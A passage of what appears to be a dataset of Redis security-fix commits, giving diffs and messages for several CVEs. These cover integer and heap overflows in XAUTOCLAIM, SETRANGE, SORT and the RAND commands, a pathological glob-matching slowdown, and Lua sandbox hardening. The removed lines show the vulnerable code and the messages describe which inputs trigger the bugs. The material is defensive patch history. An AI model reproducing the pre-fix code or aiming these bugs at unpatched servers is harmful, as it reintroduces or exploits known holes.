    -        fprintf(stderr, \"strbuf(%lx) resize: %d => %d\\n\",\n+        fprintf(stderr,\
    \ \"strbuf(%lx) resize: %zd => %zd\\n\",\n                 (long)s, s->size, newsize);\n\
    \     }\n \n     s->size = newsize;\n     s->buf = realloc(s->buf, s->size);\n\
    \     if (!s->buf)\n-        die(\"Out of memory\");\n+        die(\"Out of memory,\
    \ len: %zu\", len);\n     s->reallocs++;\n }\n \n void strbuf_append_string(strbuf_t\
    \ *s, const char *str)\n {\n-    int space, i;\n+    int i;\n+    size_t space;\n\
    \ \n     space = strbuf_empty_length(s);\n \n@@ -197,55 +193,6 @@ void strbuf_append_string(strbuf_t\
    \ *s, const char *str)\n     }\n }\n \n-/* strbuf_append_fmt() should only be\
    \ used when an upper bound\n- * is known for the output string. */\n-void strbuf_append_fmt(strbuf_t\
    \ *s, int len, const char *fmt, ...)\n-{\n-    va_list arg;\n-    int fmt_len;\n\
    -\n-    strbuf_ensure_empty_length(s, len);\n-\n-    va_start(arg, fmt);\n-  \
    \  fmt_len = vsnprintf(s->buf + s->length, len, fmt, arg);\n-    va_end(arg);\n\
    -\n-    if (fmt_len < 0)\n-        die(\"BUG: Unable to convert number\");  /*\
    \ This should never happen.. */\n-\n-    s->length += fmt_len;\n-}\n-\n-/* strbuf_append_fmt_retry()\
    \ can be used when the there is no known\n- * upper bound for the output string.\
    \ */\n-void strbuf_append_fmt_retry(strbuf_t *s, const char *fmt, ...)\n-{\n-\
    \    va_list arg;\n-    int fmt_len, try;\n-    int empty_len;\n-\n-    /* If\
    \ the first attempt to append fails, resize the buffer appropriately\n-     *\
    \ and try again */\n-    for (try = 0; ; try++) {\n-        va_start(arg, fmt);\n\
    -        /* Append the new formatted string */\n-        /* fmt_len is the length\
    \ of the string required, excluding the\n-         * trailing NULL */\n-     \
    \   empty_len = strbuf_empty_length(s);\n-        /* Add 1 since there is also\
    \ space to store the terminating NULL. */\n-        fmt_len = vsnprintf(s->buf\
    \ + s->length, empty_len + 1, fmt, arg);\n-        va_end(arg);\n-\n-        if\
    \ (fmt_len <= empty_len)\n-            break;  /* SUCCESS */\n-        if (try\
    \ > 0)\n-            die(\"BUG: length of formatted string changed\");\n-\n- \
    \       strbuf_resize(s, s->length + fmt_len);\n-    }\n-\n-    s->length += fmt_len;\n\
    -}\n \n /* vi:ai et sw=4 ts=4:\n  */"
  commit_message: "Lua cjson and cmsgpack integer overflow issues (CVE-2022-24834)\
    \ (#12398)\n\n* Fix integer overflows due to using wrong integer size.\r\n* Add\
    \ assertions / panic when overflow still happens.\r\n* Deletion of dead code to\
    \ avoid need to maintain it\r\n* Some changes are not because of bugs, but rather\
    \ paranoia.\r\n* Improve cmsgpack and cjson test coverage.\r\n\r\nCo-authored-by:\
    \ Yossi Gottlieb <yossigo@gmail.com>"
  commit_sha: 936cfa464f371666c46bff59f7c4247d48973ec6
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_string.c\n+++ b/src/t_string.c\n@@ -559,7 +559,6 @@ void mgetCommand(client\
    \ *c) {\n \n void msetGenericCommand(client *c, int nx) {\n     int j;\n-    int\
    \ setkey_flags = 0;\n \n     if ((c->argc % 2) == 0) {\n         addReplyErrorArity(c);\n\
    @@ -575,12 +574,11 @@ void msetGenericCommand(client *c, int nx) {\n         \
    \        return;\n             }\n         }\n-        setkey_flags |= SETKEY_DOESNT_EXIST;\n\
    \     }\n \n     for (j = 1; j < c->argc; j += 2) {\n         c->argv[j+1] = tryObjectEncoding(c->argv[j+1]);\n\
    -        setKey(c, c->db, c->argv[j], c->argv[j + 1], setkey_flags);\n+      \
    \  setKey(c, c->db, c->argv[j], c->argv[j + 1], 0);\n         notifyKeyspaceEvent(NOTIFY_STRING,\"\
    set\",c->argv[j],c->db->id);\n     }\n     server.dirty += (c->argc-1)/2;"
  commit_message: "Avoid assertion when MSETNX is used with the same key twice (CVE-2023-28425)\
    \ (#11940)\n\nUsing the same key twice in MSETNX command would trigger an assertion.\r\
    \n\r\nThis reverts #11594 (introduced in Redis 7.0.8)"
  commit_sha: 48e0d4788434833b47892fe9f3d91be7687f25c9
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_hash.c\n+++ b/src/t_hash.c\n@@ -1120,13 +1120,13 @@ void hrandfieldCommand(client\
    \ *c) {\n     listpackEntry ele;\n \n     if (c->argc >= 3) {\n-        if (getLongFromObjectOrReply(c,c->argv[2],&l,NULL)\
    \ != C_OK) return;\n+        if (getRangeLongFromObjectOrReply(c,c->argv[2],-LONG_MAX,LONG_MAX,&l,NULL)\
    \ != C_OK) return;\n         if (c->argc > 4 || (c->argc == 4 && strcasecmp(c->argv[3]->ptr,\"\
    withvalues\"))) {\n             addReplyErrorObject(c,shared.syntaxerr);\n   \
    \          return;\n         } else if (c->argc == 4) {\n             withvalues\
    \ = 1;\n-            if (l < LONG_MIN/2 || l > LONG_MAX/2) {\n+            if\
    \ (l < -LONG_MAX/2 || l > LONG_MAX/2) {\n                 addReplyError(c,\"value\
    \ is out of range\");\n                 return;\n             }"
  - "--- a/src/t_set.c\n+++ b/src/t_set.c\n@@ -984,7 +984,7 @@ void srandmemberWithCountCommand(client\
    \ *c) {\n \n     dict *d;\n \n-    if (getLongFromObjectOrReply(c,c->argv[2],&l,NULL)\
    \ != C_OK) return;\n+    if (getRangeLongFromObjectOrReply(c,c->argv[2],-LONG_MAX,LONG_MAX,&l,NULL)\
    \ != C_OK) return;\n     if (l >= 0) {\n         count = (unsigned long) l;\n\
    \     } else {"
  - "--- a/src/t_zset.c\n+++ b/src/t_zset.c\n@@ -4317,13 +4317,13 @@ void zrandmemberCommand(client\
    \ *c) {\n     listpackEntry ele;\n \n     if (c->argc >= 3) {\n-        if (getLongFromObjectOrReply(c,c->argv[2],&l,NULL)\
    \ != C_OK) return;\n+        if (getRangeLongFromObjectOrReply(c,c->argv[2],-LONG_MAX,LONG_MAX,&l,NULL)\
    \ != C_OK) return;\n         if (c->argc > 4 || (c->argc == 4 && strcasecmp(c->argv[3]->ptr,\"\
    withscores\"))) {\n             addReplyErrorObject(c,shared.syntaxerr);\n   \
    \          return;\n         } else if (c->argc == 4) {\n             withscores\
    \ = 1;\n-            if (l < LONG_MIN/2 || l > LONG_MAX/2) {\n+            if\
    \ (l < -LONG_MAX/2 || l > LONG_MAX/2) {\n                 addReplyError(c,\"value\
    \ is out of range\");\n                 return;\n             }"
  commit_message: "Integer Overflow in RAND commands can lead to assertion (CVE-2023-25155)\
    \ (#11857)\n\nIssue happens when passing a negative long value that greater than\r\
    \nthe max positive value that the long can store."
  commit_sha: b1939b052adc058bd814045a745ec02d3f791d7b
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/util.c\n+++ b/src/util.c\n@@ -53,8 +53,8 @@\n #define UNUSED(x) ((void)(x))\n\
    \ \n /* Glob-style pattern matching. */\n-int stringmatchlen(const char *pattern,\
    \ int patternLen,\n-        const char *string, int stringLen, int nocase)\n+static\
    \ int stringmatchlen_impl(const char *pattern, int patternLen,\n+        const\
    \ char *string, int stringLen, int nocase, int *skipLongerMatches)\n {\n     while(patternLen\
    \ && stringLen) {\n         switch(pattern[0]) {\n@@ -66,12 +66,25 @@ int stringmatchlen(const\
    \ char *pattern, int patternLen,\n             if (patternLen == 1)\n        \
    \         return 1; /* match */\n             while(stringLen) {\n-          \
    \      if (stringmatchlen(pattern+1, patternLen-1,\n-                        \
    \    string, stringLen, nocase))\n+                if (stringmatchlen_impl(pattern+1,\
    \ patternLen-1,\n+                            string, stringLen, nocase, skipLongerMatches))\n\
    \                     return 1; /* match */\n+                if (*skipLongerMatches)\n\
    +                    return 0; /* no match */\n                 string++;\n  \
    \               stringLen--;\n             }\n+            /* There was no match\
    \ for the rest of the pattern starting\n+             * from anywhere in the rest\
    \ of the string. If there were\n+             * any '*' earlier in the pattern,\
    \ we can terminate the\n+             * search early without trying to match them\
    \ to longer\n+             * substrings. This is because a longer match for the\n\
    +             * earlier part of the pattern would require the rest of the\n+ \
    \            * pattern to match starting later in the string, and we\n+      \
    \       * have just determined that there is no match for the rest\n+        \
    \     * of the pattern starting from anywhere in the current\n+             *\
    \ string. */\n+            *skipLongerMatches = 1;\n             return 0; /*\
    \ no match */\n             break;\n         case '?':\n@@ -173,6 +186,12 @@ int\
    \ stringmatchlen(const char *pattern, int patternLen,\n     return 0;\n }\n \n\
    +int stringmatchlen(const char *pattern, int patternLen,\n+        const char\
    \ *string, int stringLen, int nocase) {\n+    int skipLongerMatches = 0;\n+  \
    \  return stringmatchlen_impl(pattern,patternLen,string,stringLen,nocase,&skipLongerMatches);\n\
    +}\n+\n int stringmatch(const char *pattern, const char *string, int nocase) {\n\
    \     return stringmatchlen(pattern,strlen(pattern),string,strlen(string),nocase);\n\
    \ }"
  commit_message: "String pattern matching had exponential time complexity on pathological\
    \ patterns (CVE-2022-36021) (#11858)\n\nAuthenticated users can use string matching\
    \ commands with a\r\nspecially crafted pattern to trigger a denial-of-service\
    \ attack on Redis,\r\ncausing it to hang and consume 100% CPU time.\r\n\r\nCo-authored-by:\
    \ Tom Levy <tomlevy93@gmail.com>"
  commit_sha: dcbfcb916ca1a269b3feef86ee86835294758f84
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_hash.c\n+++ b/src/t_hash.c\n@@ -1120,8 +1120,13 @@ void hrandfieldCommand(client\
    \ *c) {\n         if (c->argc > 4 || (c->argc == 4 && strcasecmp(c->argv[3]->ptr,\"\
    withvalues\"))) {\n             addReplyErrorObject(c,shared.syntaxerr);\n   \
    \          return;\n-        } else if (c->argc == 4)\n+        } else if (c->argc\
    \ == 4) {\n             withvalues = 1;\n+            if (l < LONG_MIN/2 || l\
    \ > LONG_MAX/2) {\n+                addReplyError(c,\"value is out of range\"\
    );\n+                return;\n+            }\n+        }\n         hrandfieldWithCountCommand(c,\
    \ l, withvalues);\n         return;\n     }"
  - "--- a/src/t_zset.c\n+++ b/src/t_zset.c\n@@ -4317,8 +4317,13 @@ void zrandmemberCommand(client\
    \ *c) {\n         if (c->argc > 4 || (c->argc == 4 && strcasecmp(c->argv[3]->ptr,\"\
    withscores\"))) {\n             addReplyErrorObject(c,shared.syntaxerr);\n   \
    \          return;\n-        } else if (c->argc == 4)\n+        } else if (c->argc\
    \ == 4) {\n             withscores = 1;\n+            if (l < LONG_MIN/2 || l\
    \ > LONG_MAX/2) {\n+                addReplyError(c,\"value is out of range\"\
    );\n+                return;\n+            }\n+        }\n         zrandmemberWithCountCommand(c,\
    \ l, withscores);\n         return;\n     }"
  commit_message: "Fix range issues in ZRANDMEMBER and HRANDFIELD (CVE-2023-22458)\
    \ (#11674)\n\nmissing range check in ZRANDMEMBER and HRANDIFLD leading to panic\
    \ due\r\nto protocol limitations"
  commit_sha: 16f408b1a0121cacd44cbf8aee275d69dc627f02
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/sort.c\n+++ b/src/sort.c\n@@ -328,8 +328,10 @@ void sortCommandGeneric(client\
    \ *c, int readonly) {\n     default: vectorlen = 0; serverPanic(\"Bad SORT type\"\
    ); /* Avoid GCC warning */\n     }\n \n-    /* Perform LIMIT start,count sanity\
    \ checking. */\n-    start = (limit_start < 0) ? 0 : limit_start;\n+    /* Perform\
    \ LIMIT start,count sanity checking.\n+     * And avoid integer overflow by limiting\
    \ inputs to object sizes. */\n+    start = min(max(limit_start, 0), vectorlen);\n\
    +    limit_count = min(max(limit_count, -1), vectorlen);\n     end = (limit_count\
    \ < 0) ? vectorlen-1 : start+limit_count-1;\n     if (start >= vectorlen) {\n\
    \         start = vectorlen-1;"
  - "--- a/src/t_string.c\n+++ b/src/t_string.c\n@@ -37,8 +37,14 @@ int getGenericCommand(client\
    \ *c);\n  * String Commands\n  *----------------------------------------------------------------------------*/\n\
    \ \n-static int checkStringLength(client *c, long long size) {\n-    if (!mustObeyClient(c)\
    \ && size > server.proto_max_bulk_len) {\n+static int checkStringLength(client\
    \ *c, long long size, long long append) {\n+    if (mustObeyClient(c))\n+    \
    \    return C_OK;\n+    /* 'uint64_t' cast is there just to prevent undefined\
    \ behavior on overflow */\n+    long long total = (uint64_t)size + append;\n+\
    \    /* Test configured max-bulk-len represending a limit of the biggest string\
    \ object,\n+     * and also test for overflow. */\n+    if (total > server.proto_max_bulk_len\
    \ || total < size || total < append) {\n         addReplyError(c,\"string exceeds\
    \ maximum allowed size (proto-max-bulk-len)\");\n         return C_ERR;\n    \
    \ }\n@@ -454,7 +460,7 @@ void setrangeCommand(client *c) {\n         }\n \n  \
    \       /* Return when the resulting string exceeds allowed size */\n-       \
    \ if (checkStringLength(c,offset+sdslen(value)) != C_OK)\n+        if (checkStringLength(c,offset,sdslen(value))\
    \ != C_OK)\n             return;\n \n         o = createObject(OBJ_STRING,sdsnewlen(NULL,\
    \ offset+sdslen(value)));\n@@ -474,7 +480,7 @@ void setrangeCommand(client *c)\
    \ {\n         }\n \n         /* Return when the resulting string exceeds allowed\
    \ size */\n-        if (checkStringLength(c,offset+sdslen(value)) != C_OK)\n+\
    \        if (checkStringLength(c,offset,sdslen(value)) != C_OK)\n            \
    \ return;\n \n         /* Create a copy when the object is shared or encoded.\
    \ */\n@@ -703,8 +709,7 @@ void appendCommand(client *c) {\n \n         /* \"append\"\
    \ is an argument, so always an sds */\n         append = c->argv[2];\n-      \
    \  totlen = stringObjectLen(o)+sdslen(append->ptr);\n-        if (checkStringLength(c,totlen)\
    \ != C_OK)\n+        if (checkStringLength(c,stringObjectLen(o),sdslen(append->ptr))\
    \ != C_OK)\n             return;\n \n         /* Append the value */"
  commit_message: "Avoid integer overflows in SETRANGE and SORT (CVE-2022-35977) (#11720)\n\
    \nAuthenticated users issuing specially crafted SETRANGE and SORT(_RO)\r\ncommands\
    \ can trigger an integer overflow, resulting with Redis attempting\r\nto allocate\
    \ impossible amounts of memory and abort with an OOM panic."
  commit_sha: 1ec82e6e97e1db06a72ca505f9fbf6b981f31ef7
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_stream.c\n+++ b/src/t_stream.c\n@@ -3334,6 +3334,7 @@ void xautoclaimCommand(client\
    \ *c) {\n     robj *o = lookupKeyRead(c->db,c->argv[1]);\n     long long minidle;\
    \ /* Minimum idle time argument, in milliseconds. */\n     long count = 100; /*\
    \ Maximum entries to claim. */\n+    const unsigned attempts_factor = 10;\n  \
    \   streamID startid;\n     int startex;\n     int justid = 0;\n@@ -3356,7 +3357,8\
    \ @@ void xautoclaimCommand(client *c) {\n         int moreargs = (c->argc-1)\
    \ - j; /* Number of additional arguments. */\n         char *opt = c->argv[j]->ptr;\n\
    \         if (!strcasecmp(opt,\"COUNT\") && moreargs) {\n-            if (getRangeLongFromObjectOrReply(c,c->argv[j+1],1,LONG_MAX,&count,\"\
    COUNT must be > 0\") != C_OK)\n+            long max_count = LONG_MAX / (max(sizeof(streamID),\
    \ attempts_factor));\n+            if (getRangeLongFromObjectOrReply(c,c->argv[j+1],1,max_count,&count,\"\
    COUNT must be > 0\") != C_OK)\n                 return;\n             j++;\n \
    \        } else if (!strcasecmp(opt,\"JUSTID\")) {\n@@ -3383,9 +3385,15 @@ void\
    \ xautoclaimCommand(client *c) {\n         return;\n     }\n \n+    streamID *deleted_ids\
    \ = ztrymalloc(count * sizeof(streamID));\n+    if (!deleted_ids) {\n+       \
    \ addReplyError(c, \"Insufficient memory, failed allocating transient memory,\
    \ COUNT too high.\");\n+        return;\n+    }\n+\n     /* Do the actual claiming.\
    \ */\n     streamConsumer *consumer = NULL;\n-    long long attempts = count*10;\n\
    +    long long attempts = count * attempts_factor;\n \n     addReplyArrayLen(c,\
    \ 3); /* We add another reply later */\n     void *endidptr = addReplyDeferredLen(c);\
    \ /* reply[0] */\n@@ -3399,7 +3407,6 @@ void xautoclaimCommand(client *c) {\n\
    \     size_t arraylen = 0;\n     mstime_t now = mstime();\n     sds name = c->argv[3]->ptr;\n\
    -    streamID *deleted_ids = zmalloc(count * sizeof(streamID));\n     int deleted_id_num\
    \ = 0;\n     while (attempts-- && count && raxNext(&ri)) {\n         streamNACK\
    \ *nack = ri.data;"
  commit_message: "Fix heap overflow vulnerability in XAUTOCLAIM (CVE-2022-35951)\
    \ (#11301)\n\nExecuting an XAUTOCLAIM command on a stream key in a specific state,\
    \ with a\r\nspecially crafted COUNT argument may cause an integer overflow, a\
    \ subsequent\r\nheap overflow, and potentially lead to remote code execution.\r\
    \nThe problem affects Redis versions 7.0.0 or newer."
  commit_sha: 6d21560190fd5b09ff849ad1777e868d5e78da5f
  repo_name: redis/redis
- commit_diff:
  - "--- a/src/t_stream.c\n+++ b/src/t_stream.c\n@@ -3421,6 +3421,7 @@ void xautoclaimCommand(client\
    \ *c) {\n             /* Remember the ID for later */\n             deleted_ids[deleted_id_num++]\
    \ = id;\n             raxSeek(&ri,\">=\",ri.key,ri.key_len);\n+            count--;\
    \ /* Count is a limit of the command response size. */\n             continue;\n\
    \         }\n "
  commit_message: "Fix heap overflow corruption in XAUTOCLAIM (CVE-2022-31144) (#11002)\n\
    \nThe temporary array for deleted entries reply of XAUTOCLAIM was\r\ninsufficient,\
    \ but also in fact the COUNT argument should be used to\r\ncontrol the size of\
    \ the reply, so instead of terminating the loop by\r\nonly counting the claimed\
    \ entries, we'll count deleted entries as well.\r\n\r\nFix #10968\r\nAddresses\
    \ CVE-2022-31144"
  commit_sha: 2825b6057bee911e69b6fd30eb338d02e9d7ff90
  repo_name: redis/redis
- commit_diff:
  - "--- a/deps/lua/src/lapi.c\n+++ b/deps/lua/src/lapi.c\n@@ -674,6 +674,8 @@ LUA_API\
    \ void lua_rawset (lua_State *L, int idx) {\n   api_checknelems(L, 2);\n   t =\
    \ index2adr(L, idx);\n   api_check(L, ttistable(t));\n+  if (hvalue(t)->readonly)\n\
    +    luaG_runerror(L, \"Attempt to modify a readonly table\");\n   setobj2t(L,\
    \ luaH_set(L, hvalue(t), L->top-2), L->top-1);\n   luaC_barriert(L, hvalue(t),\
    \ L->top-1);\n   L->top -= 2;\n@@ -687,6 +689,8 @@ LUA_API void lua_rawseti (lua_State\
    \ *L, int idx, int n) {\n   api_checknelems(L, 1);\n   o = index2adr(L, idx);\n\
    \   api_check(L, ttistable(o));\n+  if (hvalue(o)->readonly)\n+    luaG_runerror(L,\
    \ \"Attempt to modify a readonly table\");\n   setobj2t(L, luaH_setnum(L, hvalue(o),\
    \ n), L->top-1);\n   luaC_barriert(L, hvalue(o), L->top-1);\n   L->top--;\n@@\
    \ -709,6 +713,8 @@ LUA_API int lua_setmetatable (lua_State *L, int objindex) {\n\
    \   }\n   switch (ttype(obj)) {\n     case LUA_TTABLE: {\n+      if (hvalue(obj)->readonly)\n\
    +        luaG_runerror(L, \"Attempt to modify a readonly table\");\n       hvalue(obj)->metatable\
    \ = mt;\n       if (mt)\n         luaC_objbarriert(L, hvalue(obj), mt);\n@@ -1085,3\
    \ +1091,19 @@ LUA_API const char *lua_setupvalue (lua_State *L, int funcindex,\
    \ int n) {\n   return name;\n }\n \n+LUA_API void lua_enablereadonlytable (lua_State\
    \ *L, int objindex, int enabled) {\n+  const TValue* o = index2adr(L, objindex);\n\
    +  api_check(L, ttistable(o));\n+  Table* t = hvalue(o);\n+  api_check(L, t !=\
    \ hvalue(registry(L)));\n+  t->readonly = enabled;\n+}\n+\n+LUA_API int lua_isreadonlytable\
    \ (lua_State *L, int objindex) {\n+    const TValue* o = index2adr(L, objindex);\n\
    +  api_check(L, ttistable(o));\n+  Table* t = hvalue(o);\n+  api_check(L, t !=\
    \ hvalue(registry(L)));\n+  return t->readonly;\n+}\n+"
  - "--- a/deps/lua/src/ltable.c\n+++ b/deps/lua/src/ltable.c\n@@ -364,6 +364,7 @@\
    \ Table *luaH_new (lua_State *L, int narray, int nhash) {\n   t->array = NULL;\n\
    \   t->sizearray = 0;\n   t->lsizenode = 0;\n+  t->readonly = 0;\n   t->node =\
    \ cast(Node *, dummynode);\n   setarrayvector(L, t, narray);\n   setnodevector(L,\
    \ t, nhash);"
  - "--- a/deps/lua/src/lvm.c\n+++ b/deps/lua/src/lvm.c\n@@ -138,6 +138,8 @@ void\
    \ luaV_settable (lua_State *L, const TValue *t, TValue *key, StkId val) {\n  \
    \   const TValue *tm;\n     if (ttistable(t)) {  /* `t' is a table? */\n     \
    \  Table *h = hvalue(t);\n+      if (h->readonly)\n+        luaG_runerror(L, \"\
    Attempt to modify a readonly table\");\n       TValue *oldval = luaH_set(L, h,\
    \ key); /* do a primitive set */\n       if (!ttisnil(oldval) ||  /* result is\
    \ no nil? */\n           (tm = fasttm(L, h->metatable, TM_NEWINDEX)) == NULL)\
    \ { /* or no TM? */"
  - "--- a/src/eval.c\n+++ b/src/eval.c\n@@ -218,24 +218,13 @@ void scriptingInit(int\
    \ setup) {\n \n     lua_setglobal(lua,\"redis\");\n \n-    /* Add a helper function\
    \ that we use to sort the multi bulk output of non\n-     * deterministic commands,\
    \ when containing 'false' elements. */\n-    {\n-        char *compare_func =\
    \    \"function __redis__compare_helper(a,b)\\n\"\n-                         \
    \       \"  if a == false then a = '' end\\n\"\n-                            \
    \    \"  if b == false then b = '' end\\n\"\n-                               \
    \ \"  return a<b\\n\"\n-                                \"end\\n\";\n-       \
    \ luaL_loadbuffer(lua,compare_func,strlen(compare_func),\"@cmp_func_def\");\n\
    -        lua_pcall(lua,0,0,0);\n-    }\n-\n     /* Add a helper function we use\
    \ for pcall error reporting.\n      * Note that when the error is in the C function\
    \ we want to report the\n      * information about the caller, that's what makes\
    \ sense from the point\n      * of view of the user debugging a script. */\n \
    \    {\n         char *errh_func =       \"local dbg = debug\\n\"\n+         \
    \                       \"debug = nil\\n\"\n                                 \"\
    function __redis__err__handler(err)\\n\"\n                                 \"\
    \  local i = dbg.getinfo(2,'nSl')\\n\"\n                                 \"  if\
    \ i and i.what == 'C' then\\n\"\n@@ -266,10 +255,12 @@ void scriptingInit(int\
    \ setup) {\n         lctx.lua_client->flags |= CLIENT_DENY_BLOCKING;\n     }\n\
    \ \n-    /* Lua beginners often don't use \"local\", this is likely to introduce\n\
    -     * subtle bugs in their code. To prevent problems we protect accesses\n-\
    \     * to global variables. */\n-    luaEnableGlobalsProtection(lua, 1);\n+ \
    \   /* Lock the global table from any changes */\n+    lua_pushvalue(lua, LUA_GLOBALSINDEX);\n\
    +    luaSetErrorMetatable(lua);\n+    /* Recursively lock all tables that can\
    \ be reached from the global table */\n+    luaSetTableProtectionRecursively(lua);\n\
    +    lua_pop(lua, 1);\n \n     lctx.lua = lua;\n }\n@@ -378,35 +369,20 @@ sds\
    \ luaCreateFunction(client *c, robj *body) {\n         sdsfreesplitres(parts,\
    \ numparts);\n     }\n \n-    /* Build the lua function to be loaded */\n-   \
    \ sds funcdef = sdsempty();\n-    funcdef = sdscat(funcdef,\"function \");\n-\
    \    funcdef = sdscatlen(funcdef,funcname,42);\n-    funcdef = sdscatlen(funcdef,\"\
    () \",3);\n     /* Note that in case of a shebang line we skip it but keep the\
    \ line feed to conserve the user's line numbers */\n-    funcdef = sdscatlen(funcdef,(char*)body->ptr\
    \ + shebang_len,sdslen(body->ptr) - shebang_len);\n-    funcdef = sdscatlen(funcdef,\"\
    \\nend\",4);\n-\n-    if (luaL_loadbuffer(lctx.lua,funcdef,sdslen(funcdef),\"\
    @user_script\")) {\n+    if (luaL_loadbuffer(lctx.lua,(char*)body->ptr + shebang_len,sdslen(body->ptr)\
    \ - shebang_len,\"@user_script\")) {\n         if (c != NULL) {\n            \
    \ addReplyErrorFormat(c,\n                 \"Error compiling script (new function):\
    \ %s\",\n                 lua_tostring(lctx.lua,-1));\n         }\n         lua_pop(lctx.lua,1);\n\
    -        sdsfree(funcdef);\n         return NULL;\n     }\n-    sdsfree(funcdef);\n\
    \ \n-    if (lua_pcall(lctx.lua,0,0,0)) {\n-        if (c != NULL) {\n-      \
    \      addReplyErrorFormat(c,\"Error running script (new function): %s\",\n- \
    \               lua_tostring(lctx.lua,-1));\n-        }\n-        lua_pop(lctx.lua,1);\n\
    -        return NULL;\n-    }\n+    serverAssert(lua_isfunction(lctx.lua, -1));\n\
    +\n+    lua_setfield(lctx.lua, LUA_REGISTRYINDEX, funcname);\n \n     /* We also\
    \ save a SHA1 -> Original script map in a dictionary\n      * so that we can replicate\
    \ / write in the AOF all the\n@@ -479,7 +455,7 @@ void evalGenericCommand(client\
    \ *c, int evalsha) {\n     lua_getglobal(lua, \"__redis__err__handler\");\n \n\
    \     /* Try to lookup the Lua function */\n-    lua_getglobal(lua, funcname);\n\
    +    lua_getfield(lua, LUA_REGISTRYINDEX, funcname);\n     if (lua_isnil(lua,-1))\
    \ {\n         lua_pop(lua,1); /* remove the nil from the stack */\n         /*\
    \ Function not defined... let's define it if we have the\n@@ -497,7 +473,7 @@\
    \ void evalGenericCommand(client *c, int evalsha) {\n             return;\n  \
    \       }\n         /* Now the following is guaranteed to return non nil */\n\
    -        lua_getglobal(lua, funcname);\n+        lua_getfield(lua, LUA_REGISTRYINDEX,\
    \ funcname);\n         serverAssert(!lua_isnil(lua,-1));\n     }\n "
  - "--- a/src/function_lua.c\n+++ b/src/function_lua.c\n@@ -50,6 +50,7 @@\n #define\
    \ REGISTRY_ERROR_HANDLER_NAME \"__ERROR_HANDLER__\"\n #define REGISTRY_LOAD_CTX_NAME\
    \ \"__LIBRARY_CTX__\"\n #define LIBRARY_API_NAME \"__LIBRARY_API__\"\n+#define\
    \ GLOBALS_API_NAME \"__GLOBALS_API__\"\n #define LOAD_TIMEOUT_MS 500\n \n /* Lua\
    \ engine ctx */\n@@ -99,42 +100,23 @@ static void luaEngineLoadHook(lua_State\
    \ *lua, lua_Debug *ar) {\n  * Return NULL on compilation error and set the error\
    \ to the err variable\n  */\n static int luaEngineCreate(void *engine_ctx, functionLibInfo\
    \ *li, sds blob, sds *err) {\n+    int ret = C_ERR;\n     luaEngineCtx *lua_engine_ctx\
    \ = engine_ctx;\n     lua_State *lua = lua_engine_ctx->lua;\n \n-    /* Each library\
    \ will have its own global distinct table.\n-     * We will create a new fresh\
    \ Lua table and use\n-     * lua_setfenv to set the table as the library globals\n\
    -     * (https://www.lua.org/manual/5.1/manual.html#lua_setfenv)\n-     *\n- \
    \    * At first, populate this new table with only the 'library' API\n-     *\
    \ to make sure only 'library' API is available at start. After the\n-     * initial\
    \ run is finished and all functions are registered, add\n-     * all the default\
    \ globals to the library global table and delete\n-     * the library API.\n-\
    \     *\n-     * There are 2 ways to achieve the last part (add default\n-   \
    \  * globals to the new table):\n-     *\n-     * 1. Initialize the new table\
    \ with all the default globals\n-     * 2. Inheritance using metatable (https://www.lua.org/pil/14.3.html)\n\
    -     *\n-     * For now we are choosing the second, we can change it in the future\
    \ to\n-     * achieve a better isolation between functions. */\n-    lua_newtable(lua);\
    \ /* Global table for the library */\n-    lua_pushstring(lua, REDIS_API_NAME);\n\
    -    lua_pushstring(lua, LIBRARY_API_NAME);\n-    lua_gettable(lua, LUA_REGISTRYINDEX);\
    \ /* get library function from registry */\n-    lua_settable(lua, -3); /* push\
    \ the library table to the new global table */\n-\n-    /* Set global protection\
    \ on the new global table */\n-    luaSetGlobalProtection(lua_engine_ctx->lua);\n\
    +    /* set load library globals */\n+    lua_getmetatable(lua, LUA_GLOBALSINDEX);\n\
    +    lua_enablereadonlytable(lua, -1, 0); /* disable global protection */\n+ \
    \   lua_getfield(lua, LUA_REGISTRYINDEX, LIBRARY_API_NAME);\n+    lua_setfield(lua,\
    \ -2, \"__index\");\n+    lua_enablereadonlytable(lua, LUA_GLOBALSINDEX, 1); /*\
    \ enable global protection */\n+    lua_pop(lua, 1); /* pop the metatable */\n\
    \ \n     /* compile the code */\n     if (luaL_loadbuffer(lua, blob, sdslen(blob),\
    \ \"@user_function\")) {\n         *err = sdscatprintf(sdsempty(), \"Error compiling\
    \ function: %s\", lua_tostring(lua, -1));\n-        lua_pop(lua, 2); /* pops the\
    \ error and globals table */\n-        return C_ERR;\n+        lua_pop(lua, 1);\
    \ /* pops the error */\n+        goto done;\n     }\n     serverAssert(lua_isfunction(lua,\
    \ -1));\n \n@@ -144,45 +126,31 @@ static int luaEngineCreate(void *engine_ctx,\
    \ functionLibInfo *li, sds blob, sds\n     };\n     luaSaveOnRegistry(lua, REGISTRY_LOAD_CTX_NAME,\
    \ &load_ctx);\n \n-    /* set the function environment so only 'library' API can\
    \ be accessed. */\n-    lua_pushvalue(lua, -2); /* push global table to the front\
    \ */\n-    lua_setfenv(lua, -2);\n-\n     lua_sethook(lua,luaEngineLoadHook,LUA_MASKCOUNT,100000);\n\
    \     /* Run the compiled code to allow it to register functions */\n     if (lua_pcall(lua,0,0,0))\
    \ {\n         errorInfo err_info = {0};\n         luaExtractErrorInformation(lua,\
    \ &err_info);\n         *err = sdscatprintf(sdsempty(), \"Error registering functions:\
    \ %s\", err_info.msg);\n-        lua_pop(lua, 2); /* pops the error and globals\
    \ table */\n-        lua_sethook(lua,NULL,0,0); /* Disable hook */\n-        luaSaveOnRegistry(lua,\
    \ REGISTRY_LOAD_CTX_NAME, NULL);\n+        lua_pop(lua, 1); /* pops the error\
    \ */\n         luaErrorInformationDiscard(&err_info);\n-        return C_ERR;\n\
    +        goto done;\n     }\n-    lua_sethook(lua,NULL,0,0); /* Disable hook */\n\
    -    luaSaveOnRegistry(lua, REGISTRY_LOAD_CTX_NAME, NULL);\n \n-    /* stack contains\
    \ the global table, lets rearrange it to contains the entire API. */\n-    /*\
    \ delete 'redis' API */\n-    lua_pushstring(lua, REDIS_API_NAME);\n-    lua_pushnil(lua);\n\
    -    lua_settable(lua, -3);\n-\n-    /* create metatable */\n-    lua_newtable(lua);\n\
    -    lua_pushstring(lua, \"__index\");\n-    lua_pushvalue(lua, LUA_GLOBALSINDEX);\
